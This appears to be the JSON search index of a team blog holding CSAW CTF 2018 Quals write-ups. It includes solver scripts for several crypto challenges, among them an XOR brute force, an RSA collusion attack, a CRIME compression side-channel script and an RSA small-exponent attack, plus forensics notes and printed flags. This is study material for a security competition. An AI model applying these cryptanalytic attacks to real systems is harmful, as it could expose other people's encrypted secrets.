{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"DF Team blogs \u00b6","title":"Getting Started"},{"location":"#df-team-blogs","text":"","title":"DF Team blogs"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/","text":"Solution \u00b6 Single byte brute to get flag! (its not that bad) Description \u00b6 yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet single yeet yeeted with single yeet == 0 yeeet what is yeet? yeet is yeet Yeetdate: yeeted yeet at yeet: 9:42 pm Flag \u00b6 flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#solution","text":"Single byte brute to get flag! (its not that bad)","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#description","text":"yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet single yeet yeeted with single yeet == 0 yeeet what is yeet? yeet is yeet Yeetdate: yeeted yeet at yeet: 9:42 pm","title":"Description"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#flag","text":"flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/writeup/","text":"babycrypto \u00b6 \u6839\u636e\u63d0\u793a\u8054\u60f3\u5230xor\u3002 base64\u89e3\u7801\u540e\uff0c\u7206\u7834xor\u5373\u53ef\u3002 exp.py: from base64 import b64decode CIPHERTEXT_FILE = 'ciphertext.txt' encrypted = None with open ( CIPHERTEXT_FILE , 'r' ) as f : s = f . read () encrypted = b64decode ( s ) for i in range ( 256 ): s = '' . join ( chr ( ord ( c ) ^ i ) for c in encrypted ) print s flag: flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"babycrypto"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/writeup/#babycrypto","text":"\u6839\u636e\u63d0\u793a\u8054\u60f3\u5230xor\u3002 base64\u89e3\u7801\u540e\uff0c\u7206\u7834xor\u5373\u53ef\u3002 exp.py: from base64 import b64decode CIPHERTEXT_FILE = 'ciphertext.txt' encrypted = None with open ( CIPHERTEXT_FILE , 'r' ) as f : s = f . read () encrypted = b64decode ( s ) for i in range ( 256 ): s = '' . join ( chr ( ord ( c ) ^ i ) for c in encrypted ) print s flag: flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"babycrypto"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/","text":"Details \u00b6 A while ago I found a construction of collusion-secure, identity-based encryption built solely from RSA. A small group of cryptographers were confident enough in it to write a paper and publish it. But at the same time, the cryptanalysis is constant-time and can be done with undergrad-level number theory. This makes it an attractive CTF problem, in my mind. The system is as follows: KeyGen(): Generate two safe primes p, q for an RSA modulus N=pq. Set Phi(N) = (p-1)(q-1). Choose x, a random even integer greater than zero and less than Phi(N). Choose g, a generator of Z/NZ. Return: Master public key = { N, g, g^x (mod N) } Master private key = { p, q, x }. IssueKey(Master private key, Decrypter name): With a public hash function, compute n (an odd integer greater than zero and less than N) as the hash of the decrypter's name. Return: Decrypter private key = { 1/(x+n) (mod Phi(N)) }. Encrypt(Master public key, Decrypter name, Message): With the same method as IssueKey, compute n as the hash of the decrypter's name. Choose r, a random integer greater than zero and less than N. Compute K = g^r (mod N) and A = (g x * g n)^r. Compute C = Encrypt_K(Message) Return: Ciphertext = { A, C }. Decrypt(Decrypter private key, Ciphertext): Compute K = A^(1/(x+n)) (mod N). Return: Decrypt_K(C). We give somebody the master public key, a ciphertext encrypted to A, and decrypter keys for B, C. The challenge is to decrypt the message to A.","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/#details","text":"A while ago I found a construction of collusion-secure, identity-based encryption built solely from RSA. A small group of cryptographers were confident enough in it to write a paper and publish it. But at the same time, the cryptanalysis is constant-time and can be done with undergrad-level number theory. This makes it an attractive CTF problem, in my mind. The system is as follows: KeyGen(): Generate two safe primes p, q for an RSA modulus N=pq. Set Phi(N) = (p-1)(q-1). Choose x, a random even integer greater than zero and less than Phi(N). Choose g, a generator of Z/NZ. Return: Master public key = { N, g, g^x (mod N) } Master private key = { p, q, x }. IssueKey(Master private key, Decrypter name): With a public hash function, compute n (an odd integer greater than zero and less than N) as the hash of the decrypter's name. Return: Decrypter private key = { 1/(x+n) (mod Phi(N)) }. Encrypt(Master public key, Decrypter name, Message): With the same method as IssueKey, compute n as the hash of the decrypter's name. Choose r, a random integer greater than zero and less than N. Compute K = g^r (mod N) and A = (g x * g n)^r. Compute C = Encrypt_K(Message) Return: Ciphertext = { A, C }. Decrypt(Decrypter private key, Ciphertext): Compute K = A^(1/(x+n)) (mod N). Return: Decrypt_K(C). We give somebody the master public key, a ciphertext encrypted to A, and decrypter keys for B, C. The challenge is to decrypt the message to A.","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/writeup/","text":"collusion \u00b6 exp.py package main import ( \"crypto/rand\" \"encoding/json\" \"fmt\" \"math/big\" \"io/ioutil\" \"log\" ) // Not sure why this isn't in common.go; it's the trivial inverse of Encrypt func Decrypt ( d * Decrypter , payload * Payload ) ( string , error ) { shared := d . RecoverKey ( payload . V ) block , err := aes . NewCipher ( shared ) if err != nil { return \"\" , err } ciph , err := cipher . NewGCM ( block ) if err != nil { return \"\" , err } message , err := ciph . Open ( nil , payload . Nonce , payload . Body , nil ) if err != nil { return \"\" , err } return string ( message ), nil } const TEST = 0 func main () { var g * Group var dB * Decrypter var dC * Decrypter var payload * Payload if TEST != 0 { // Test group var err error g , err = NewGroup ( rand . Reader , 1024 ) if err != nil { log . Fatal ( err ) } dB , err = g . Decrypter ( \"Bob\" ) if err != nil { log . Fatal ( err ) } dC , err = g . Decrypter ( \"Carol\" ) if err != nil { log . Fatal ( err ) } e := g . Encrypter () payload , err = Encrypt ( e , \"Alice\" , \"flag{testflag}\" ) if err != nil { log . Fatal ( err ) } } else { // Load the challenge dB = new ( Decrypter ) if err := loadFromFile ( \"bobs-key.json\" , & dB ); err != nil { log . Fatal ( err ) } dC = new ( Decrypter ) if err := loadFromFile ( \"carols-key.json\" , & dC ); err != nil { log . Fatal ( err ) } if dB . N . Cmp ( dC . N ) != 0 { log . Fatal ( \"N doesn't match!\" ) } payload = new ( Payload ) if err := loadFromFile ( \"message.json\" , & payload ); err != nil { log . Fatal ( err ) } } N := new ( big . Int ). Set ( dB . N ) aId , err := DecrypterId ( \"Alice\" , N ) if err != nil { log . Fatal ( err ) } bId , err := DecrypterId ( \"Bob\" , N ) if err != nil { log . Fatal ( err ) } cId , err := DecrypterId ( \"Carol\" , N ) if err != nil { log . Fatal ( err ) } fmt . Println ( \"Alice's ID\" , aId ) fmt . Println ( \"Bob's ID\" , bId ) fmt . Println ( \"Carol's ID\" , cId ) myPhi := new ( big . Int ) myPhi . Sub ( bId , cId ). Mul ( myPhi , dB . D ). Mul ( myPhi , dC . D ) myPhi . Add ( myPhi , dB . D ). Sub ( myPhi , dC . D ) myPhi . Abs ( myPhi ) fmt . Println ( \"myPhi\" , myPhi ) if TEST != 0 { fmt . Println ( \"phi\" , phi ( g . P , g . Q )) fmt . Println ( \"residue\" , new ( big . Int ). Mod ( myPhi , phi ( g . P , g . Q ))) } xB := new ( big . Int ). ModInverse ( dB . D , myPhi ) if xB == nil { log . Fatal ( \"Not relatively prime!\" ) } x := new ( big . Int ). Sub ( xB , bId ) x . Mod ( x , myPhi ) xA := new ( big . Int ). Add ( x , aId ) xA . Mod ( xA , myPhi ) dA := & Decrypter { N : N , D : new ( big . Int ). ModInverse ( xA , myPhi ), } if TEST != 0 { fmt . Println ( \"my dA\" , new ( big . Int ). Mod ( dA . D , phi ( g . P , g . Q ))) realDA , err := g . Decrypter ( \"Alice\" ) if err != nil { panic ( err ) } fmt . Println ( \"real dA\" , realDA . D ) } message , err := Decrypt ( dA , payload ) if err != nil { log . Fatal ( err ) } fmt . Println ( \"message\" , message ) } func loadFromFile ( name string , x interface {}) error { raw , err := ioutil . ReadFile ( name ) if err != nil { return err } return json . Unmarshal ( raw , x ) }","title":"collusion"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/writeup/#collusion","text":"exp.py package main import ( \"crypto/rand\" \"encoding/json\" \"fmt\" \"math/big\" \"io/ioutil\" \"log\" ) // Not sure why this isn't in common.go; it's the trivial inverse of Encrypt func Decrypt ( d * Decrypter , payload * Payload ) ( string , error ) { shared := d . RecoverKey ( payload . V ) block , err := aes . NewCipher ( shared ) if err != nil { return \"\" , err } ciph , err := cipher . NewGCM ( block ) if err != nil { return \"\" , err } message , err := ciph . Open ( nil , payload . Nonce , payload . Body , nil ) if err != nil { return \"\" , err } return string ( message ), nil } const TEST = 0 func main () { var g * Group var dB * Decrypter var dC * Decrypter var payload * Payload if TEST != 0 { // Test group var err error g , err = NewGroup ( rand . Reader , 1024 ) if err != nil { log . Fatal ( err ) } dB , err = g . Decrypter ( \"Bob\" ) if err != nil { log . Fatal ( err ) } dC , err = g . Decrypter ( \"Carol\" ) if err != nil { log . Fatal ( err ) } e := g . Encrypter () payload , err = Encrypt ( e , \"Alice\" , \"flag{testflag}\" ) if err != nil { log . Fatal ( err ) } } else { // Load the challenge dB = new ( Decrypter ) if err := loadFromFile ( \"bobs-key.json\" , & dB ); err != nil { log . Fatal ( err ) } dC = new ( Decrypter ) if err := loadFromFile ( \"carols-key.json\" , & dC ); err != nil { log . Fatal ( err ) } if dB . N . Cmp ( dC . N ) != 0 { log . Fatal ( \"N doesn't match!\" ) } payload = new ( Payload ) if err := loadFromFile ( \"message.json\" , & payload ); err != nil { log . Fatal ( err ) } } N := new ( big . Int ). Set ( dB . N ) aId , err := DecrypterId ( \"Alice\" , N ) if err != nil { log . Fatal ( err ) } bId , err := DecrypterId ( \"Bob\" , N ) if err != nil { log . Fatal ( err ) } cId , err := DecrypterId ( \"Carol\" , N ) if err != nil { log . Fatal ( err ) } fmt . Println ( \"Alice's ID\" , aId ) fmt . Println ( \"Bob's ID\" , bId ) fmt . Println ( \"Carol's ID\" , cId ) myPhi := new ( big . Int ) myPhi . Sub ( bId , cId ). Mul ( myPhi , dB . D ). Mul ( myPhi , dC . D ) myPhi . Add ( myPhi , dB . D ). Sub ( myPhi , dC . D ) myPhi . Abs ( myPhi ) fmt . Println ( \"myPhi\" , myPhi ) if TEST != 0 { fmt . Println ( \"phi\" , phi ( g . P , g . Q )) fmt . Println ( \"residue\" , new ( big . Int ). Mod ( myPhi , phi ( g . P , g . Q ))) } xB := new ( big . Int ). ModInverse ( dB . D , myPhi ) if xB == nil { log . Fatal ( \"Not relatively prime!\" ) } x := new ( big . Int ). Sub ( xB , bId ) x . Mod ( x , myPhi ) xA := new ( big . Int ). Add ( x , aId ) xA . Mod ( xA , myPhi ) dA := & Decrypter { N : N , D : new ( big . Int ). ModInverse ( xA , myPhi ), } if TEST != 0 { fmt . Println ( \"my dA\" , new ( big . Int ). Mod ( dA . D , phi ( g . P , g . Q ))) realDA , err := g . Decrypter ( \"Alice\" ) if err != nil { panic ( err ) } fmt . Println ( \"real dA\" , realDA . D ) } message , err := Decrypt ( dA , payload ) if err != nil { log . Fatal ( err ) } fmt . Println ( \"message\" , message ) } func loadFromFile ( name string , x interface {}) error { raw , err := ioutil . ReadFile ( name ) if err != nil { return err } return json . Unmarshal ( raw , x ) }","title":"collusion"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/","text":"flatcrypt \u00b6 Points \u00b6 100 Description \u00b6 no logos or branding for this bug Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043 flag is not in flag format. flag is PROBLEM_KEY Flag \u00b6 crime_doesnt_have_a_logo Solution \u00b6 CRIME attack ( https://en.wikipedia.org/wiki/CRIME )","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#flatcrypt","text":"","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#description","text":"no logos or branding for this bug Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043 flag is not in flag format. flag is PROBLEM_KEY","title":"Description"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#flag","text":"crime_doesnt_have_a_logo","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#solution","text":"CRIME attack ( https://en.wikipedia.org/wiki/CRIME )","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/writeup/","text":"flatcrypt \u00b6 \u8fd9\u9898\u5c5e\u4e8eCRIME attack ( https://en.wikipedia.org/wiki/CRIME ) \u4f8b\u5982: test.py import zlib import sys PROBLEM_KEY = 'neko' print PROBLEM_KEY + sys . argv [ 1 ] print len ( zlib . compress ( PROBLEM_KEY + sys . argv [ 1 ])) \u7206\u7834\u6700\u540e\u4e00\u4f4d: python test . py `python -c 'print \"a\"*20'` nekoaaaaaaaaaaaaaaaaaaaa 14 python test . py `python -c 'print \"o\"*20'` nekooooooooooooooooooooo 13 \u53ea\u6709'o'\u7684\u65f6\u5019\u538b\u7f29\u540e\u7684\u957f\u5ea6\u6700\u77ed\uff0c\u4e3a13\u3002 \u7206\u7834\u6700\u540e\u4e24\u4f4d: python test . py `python -c 'print \"io\"*20'` nekoioioioioioioioioioioioioioioioioioioioio 15 python test . py `python -c 'print \"ko\"*20'` nekokokokokokokokokokokokokokokokokokokokoko 14 exp.py from pwn import * import string dict = string . ascii_lowercase + '_' r = remote ( '127.0.0.1' , 32770 ) flag = '' count = [ 0 for i in dict ] for i in range ( 32 ): for j in range ( len ( dict )): payload = ( dict [ j ] + flag ) * 20 junk = r . recvline () r . sendline ( payload ) l = r . recvline ()[ - 2 ] count [ j ] = ord ( l ) print count , sorted ( list ( set ( count ))) for k in dict : print ' ' , k , if len ( sorted ( list ( set ( count )))) == 3 : print ' \\n pls choose %s or %s : ' % ( dict [ count . index ( sorted ( list ( set ( count )))[ 0 ])], dict [ count . index ( sorted ( list ( set ( count )))[ 1 ])]) next_letter = raw_input () . rstrip ( ' \\n ' ) flag = next_letter + flag print flag else : flag = dict [ count . index ( min ( count ))] + flag print ' \\n [*]flag: %s \\n ' % flag","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/writeup/#flatcrypt","text":"\u8fd9\u9898\u5c5e\u4e8eCRIME attack ( https://en.wikipedia.org/wiki/CRIME ) \u4f8b\u5982: test.py import zlib import sys PROBLEM_KEY = 'neko' print PROBLEM_KEY + sys . argv [ 1 ] print len ( zlib . compress ( PROBLEM_KEY + sys . argv [ 1 ])) \u7206\u7834\u6700\u540e\u4e00\u4f4d: python test . py `python -c 'print \"a\"*20'` nekoaaaaaaaaaaaaaaaaaaaa 14 python test . py `python -c 'print \"o\"*20'` nekooooooooooooooooooooo 13 \u53ea\u6709'o'\u7684\u65f6\u5019\u538b\u7f29\u540e\u7684\u957f\u5ea6\u6700\u77ed\uff0c\u4e3a13\u3002 \u7206\u7834\u6700\u540e\u4e24\u4f4d: python test . py `python -c 'print \"io\"*20'` nekoioioioioioioioioioioioioioioioioioioioio 15 python test . py `python -c 'print \"ko\"*20'` nekokokokokokokokokokokokokokokokokokokokoko 14 exp.py from pwn import * import string dict = string . ascii_lowercase + '_' r = remote ( '127.0.0.1' , 32770 ) flag = '' count = [ 0 for i in dict ] for i in range ( 32 ): for j in range ( len ( dict )): payload = ( dict [ j ] + flag ) * 20 junk = r . recvline () r . sendline ( payload ) l = r . recvline ()[ - 2 ] count [ j ] = ord ( l ) print count , sorted ( list ( set ( count ))) for k in dict : print ' ' , k , if len ( sorted ( list ( set ( count )))) == 3 : print ' \\n pls choose %s or %s : ' % ( dict [ count . index ( sorted ( list ( set ( count )))[ 0 ])], dict [ count . index ( sorted ( list ( set ( count )))[ 1 ])]) next_letter = raw_input () . rstrip ( ' \\n ' ) flag = next_letter + flag print flag else : flag = dict [ count . index ( min ( count ))] + flag print ' \\n [*]flag: %s \\n ' % flag","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/holywater/writeup/","text":"holywater \u00b6 https://galhacktictrendsetters.wordpress.com/2018/09/17/csaw-quals-2018-holywater/ exp.py from cryptography.fernet import Fernet from lattice import Lattice GHEX = 'e002af4dec89cd6c063bca41ac24cb0636a23dcd00641990a58aafa89a62e386' PHEX = '5e91a05d58e23a1d891f576040ff7bc37bfbfd1d1fcf92c02cbd0f4cdc8ea284' CHEX = '15ff1eda110c670bdd76dc28e222d80aedaa5c6f82ec15758d8f04e4508b34fb' JHEX = '41ea7e0f2d4e4491fac0aabdd8cb1d4613bef7a29ab7fe0d60b971d3f61ad918' CIPHERTEXT = 'gAAAAABbm_jeozf2NnpedlvFzatVxOqhalOf5w1aZzgOLZ2Qx9sBakb9CK_hAAPbfjD0GDXQUrdnl_0SGQw1U1c4oTRJfO_awTloqXVUTBpHGxhP0BGWeN0=' P = 4294967279 def write_in_basis ( basis , v ): mat = matrix ( GF ( P ), basis ) assert mat . rank () == 4 b = matrix ( GF ( P ), [ v ]) return list ( mat . solve_left ( b )[ 0 ]) def solve (): g = Lattice . from_str ( GHEX ) p = Lattice . from_str ( PHEX ) c = Lattice . from_str ( CHEX ) j = Lattice . from_str ( JHEX ) one = Lattice . absolute () basis = [ p . coords (), ( g * p ) . coords (), ( p * g ) . coords (), ( g * ( p * g )) . coords ()] a = write_in_basis ( basis , c . coords ()) c1 = one . dilate ( a [ 0 ]) + g . dilate ( a [ 1 ] + a [ 2 ]) + ( g * g ) . dilate ( a [ 3 ]) basis2 = [ one . coords (), g . coords (), p . coords (), ( g * p ) . coords ()] b = write_in_basis ( basis2 , j . coords ()) ans = ( one . dilate ( b [ 0 ]) + g . dilate ( b [ 1 ])) * c1 + ( one . dilate ( b [ 2 ]) + g . dilate ( b [ 3 ])) * c key = str ( ans ) . decode ( 'hex' ) . encode ( 'base64' ) f = Fernet ( key ) msg = f . decrypt ( CIPHERTEXT ) print msg if __name__ == '__main__' : solve ()","title":"holywater"},{"location":"CSAW-CTF-2018-Quals/crypto/holywater/writeup/#holywater","text":"https://galhacktictrendsetters.wordpress.com/2018/09/17/csaw-quals-2018-holywater/ exp.py from cryptography.fernet import Fernet from lattice import Lattice GHEX = 'e002af4dec89cd6c063bca41ac24cb0636a23dcd00641990a58aafa89a62e386' PHEX = '5e91a05d58e23a1d891f576040ff7bc37bfbfd1d1fcf92c02cbd0f4cdc8ea284' CHEX = '15ff1eda110c670bdd76dc28e222d80aedaa5c6f82ec15758d8f04e4508b34fb' JHEX = '41ea7e0f2d4e4491fac0aabdd8cb1d4613bef7a29ab7fe0d60b971d3f61ad918' CIPHERTEXT = 'gAAAAABbm_jeozf2NnpedlvFzatVxOqhalOf5w1aZzgOLZ2Qx9sBakb9CK_hAAPbfjD0GDXQUrdnl_0SGQw1U1c4oTRJfO_awTloqXVUTBpHGxhP0BGWeN0=' P = 4294967279 def write_in_basis ( basis , v ): mat = matrix ( GF ( P ), basis ) assert mat . rank () == 4 b = matrix ( GF ( P ), [ v ]) return list ( mat . solve_left ( b )[ 0 ]) def solve (): g = Lattice . from_str ( GHEX ) p = Lattice . from_str ( PHEX ) c = Lattice . from_str ( CHEX ) j = Lattice . from_str ( JHEX ) one = Lattice . absolute () basis = [ p . coords (), ( g * p ) . coords (), ( p * g ) . coords (), ( g * ( p * g )) . coords ()] a = write_in_basis ( basis , c . coords ()) c1 = one . dilate ( a [ 0 ]) + g . dilate ( a [ 1 ] + a [ 2 ]) + ( g * g ) . dilate ( a [ 3 ]) basis2 = [ one . coords (), g . coords (), p . coords (), ( g * p ) . coords ()] b = write_in_basis ( basis2 , j . coords ()) ans = ( one . dilate ( b [ 0 ]) + g . dilate ( b [ 1 ])) * c1 + ( one . dilate ( b [ 2 ]) + g . dilate ( b [ 3 ])) * c key = str ( ans ) . decode ( 'hex' ) . encode ( 'base64' ) f = Fernet ( key ) msg = f . decrypt ( CIPHERTEXT ) print msg if __name__ == '__main__' : solve ()","title":"holywater"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/","text":"Details \u00b6 Participant receives : * (e,N): 1536-bit RSA public key; PEM encoded to make it look like \"real key\" * Y_os: RSA encrypted symmetric key; formatted as big-endian octet string * ciphertext C The goal is to decrypt ciphertext C without RSA private key. To generate a challenge, let's assume secret S which participant wants to \"capture\" is represented as a 64-byte string of bytes. It could be a secret password, string \"FLAG\" repeated 16 times or URL. It must have a length of exactly 64-bytes. Following components are generated: * RSA/1536 keypair, with public exponent e=3 and modulus N. The key can be encoded to PEM format to make challenge look more realistic. * Random 512-bit number K from a range N^(1/3)<K<(2N)^(1/3) . Afterwards we encrypt K with a RSA public key and convert result to big-endian octet string (Y=K^e mod N). The string will be 192 bytes long. Finally we XOR Y octet string with secret S, C=Y xor S (there may be an information in a challenge, which says that XOR was used as symmetric cipher). This is easily breakable. The key is to notice that a) there is no padding, b) by construction Y+N is a perfect cube, whose root is K (K^3 == Y+N). By Kris Kwiatkowski, Cloudflare Flag \u00b6 flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/#details","text":"Participant receives : * (e,N): 1536-bit RSA public key; PEM encoded to make it look like \"real key\" * Y_os: RSA encrypted symmetric key; formatted as big-endian octet string * ciphertext C The goal is to decrypt ciphertext C without RSA private key. To generate a challenge, let's assume secret S which participant wants to \"capture\" is represented as a 64-byte string of bytes. It could be a secret password, string \"FLAG\" repeated 16 times or URL. It must have a length of exactly 64-bytes. Following components are generated: * RSA/1536 keypair, with public exponent e=3 and modulus N. The key can be encoded to PEM format to make challenge look more realistic. * Random 512-bit number K from a range N^(1/3)<K<(2N)^(1/3) . Afterwards we encrypt K with a RSA public key and convert result to big-endian octet string (Y=K^e mod N). The string will be 192 bytes long. Finally we XOR Y octet string with secret S, C=Y xor S (there may be an information in a challenge, which says that XOR was used as symmetric cipher). This is easily breakable. The key is to notice that a) there is no padding, b) by construction Y+N is a perfect cube, whose root is K (K^3 == Y+N). By Kris Kwiatkowski, Cloudflare","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/#flag","text":"flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/writeup/","text":"lowe \u00b6 \u9898\u76ee\u540d\u5b57\u7ed9\u4e86\u63d0\u793a\uff0c\u8fd9\u9898\u5c5e\u4e8ersa\u4f4e\u6307\u6570\u653b\u51fb from Crypto.PublicKey import RSA import gmpy from Crypto.Util.number import * pub = RSA . importKey ( open ( \"./pubkey.pem\" ) . read ()) e = pub . e n = pub . n c = 219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182 i = 0 while 1 : if gmpy . root (( c + i * n ), e )[ 1 ] == 1 : print \"yes\" m = gmpy . root (( c + i * n ), e )[ 0 ] print m print i break i = i + 1 \u6c42\u51fam\u540e\uff0c\u6839\u636e\u63d0\u793a\u4e0efile.enc\u5f02\u6216\u5373\u53ef from __future__ import print_function from Crypto.Util.number import * m = 12950973085835763560175702356704747094371821722999497961023063926142573092871510801730909790343717206777660797494675328809965345887934044682722741193527531 key = long_to_bytes ( m ) f = open ( 'file.enc' ) . read () . decode ( 'base64' ) for i , j in zip ( key , f ): print ( chr ( ord ( i ) ^ ord ( j )), end = '' )","title":"lowe"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/writeup/#lowe","text":"\u9898\u76ee\u540d\u5b57\u7ed9\u4e86\u63d0\u793a\uff0c\u8fd9\u9898\u5c5e\u4e8ersa\u4f4e\u6307\u6570\u653b\u51fb from Crypto.PublicKey import RSA import gmpy from Crypto.Util.number import * pub = RSA . importKey ( open ( \"./pubkey.pem\" ) . read ()) e = pub . e n = pub . n c = 219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182 i = 0 while 1 : if gmpy . root (( c + i * n ), e )[ 1 ] == 1 : print \"yes\" m = gmpy . root (( c + i * n ), e )[ 0 ] print m print i break i = i + 1 \u6c42\u51fam\u540e\uff0c\u6839\u636e\u63d0\u793a\u4e0efile.enc\u5f02\u6216\u5373\u53ef from __future__ import print_function from Crypto.Util.number import * m = 12950973085835763560175702356704747094371821722999497961023063926142573092871510801730909790343717206777660797494675328809965345887934044682722741193527531 key = long_to_bytes ( m ) f = open ( 'file.enc' ) . read () . decode ( 'base64' ) for i , j in zip ( key , f ): print ( chr ( ord ( i ) ^ ord ( j )), end = '' )","title":"lowe"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/","text":"Title \u00b6 McGriddle Description \u00b6 All CTF players are squares Points \u00b6 250/300 Flag \u00b6 flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh} Setup \u00b6 provide output.pcap Notes \u00b6 Intended solution: get chess moves out of pcap, render chess boards, correspond with grids sent as svg, use chess board states as a grille for a grille cipher, result is a base64 encoded flag.","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#title","text":"McGriddle","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#description","text":"All CTF players are squares","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#points","text":"250/300","title":"Points"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#flag","text":"flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#setup","text":"provide output.pcap","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#notes","text":"Intended solution: get chess moves out of pcap, render chess boards, correspond with grids sent as svg, use chess board states as a grille for a grille cipher, result is a base64 encoded flag.","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/","text":"Title \u00b6 Rewind Description \u00b6 Sometimes you have to look back and replay what's has been done right and wrong Points \u00b6 TBD Flag \u00b6 flag{RUN_R3C0RD_ANA1YZ3_R3P3AT} Setup \u00b6 None Notes \u00b6 Provide the snapshot to the competitors Memory 8192 Solution \u00b6 ./qemu-system-x86_64 -replay rewind -panda memstrings:name=flag,len=31 -m 8192 gunzip -d flag_strings.txt.gz && cat flag_strings.txt | grep \"flag{\"","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#title","text":"Rewind","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#description","text":"Sometimes you have to look back and replay what's has been done right and wrong","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#points","text":"TBD","title":"Points"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#flag","text":"flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#setup","text":"None","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#notes","text":"Provide the snapshot to the competitors Memory 8192","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#solution","text":"./qemu-system-x86_64 -replay rewind -panda memstrings:name=flag,len=31 -m 8192 gunzip -d flag_strings.txt.gz && cat flag_strings.txt | grep \"flag{\"","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/","text":"Description \u00b6 Simple Recovery Try to recover the data from these RAID 5 images! Hint: The data is a checkerboard layout Hint: Parity are in inverted layout Flag \u00b6 flag{dis_week_evry_week_dnt_be_securty_weak}","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/#description","text":"Simple Recovery Try to recover the data from these RAID 5 images! Hint: The data is a checkerboard layout Hint: Parity are in inverted layout","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/#flag","text":"flag{dis_week_evry_week_dnt_be_securty_weak}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/Short-Circuit/","text":"Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format. Elyk Hint: There are 112 Things You Need to Worry About Solution: From the monkey's paw, follow the main line down the page. Label every diode on or off 1 or 0. Then go to each and every line coming off of the main line (except where labeled - I drew four lines instead of two, and made two lines come to one point instead of two connections), assigning each line to value of the connected light emitting diode. Drop the first bit/line. It's ascii.","title":"Home"},{"location":"CSAW-CTF-2018-Quals/misc/Short-Circuit/writeup/","text":"Short-Circuit \u00b6 \u7535\u8def\u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u5982\u56fe\u4e2d\u6240\u793a\uff0c\u5c0601\u7edf\u8ba1\u8d77\u6765\uff0c\u7528ascii\u89e3\u7801\u5373\u53ef\u3002 01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001 01101000 01100001 01101110 01100100 01111101 flag: 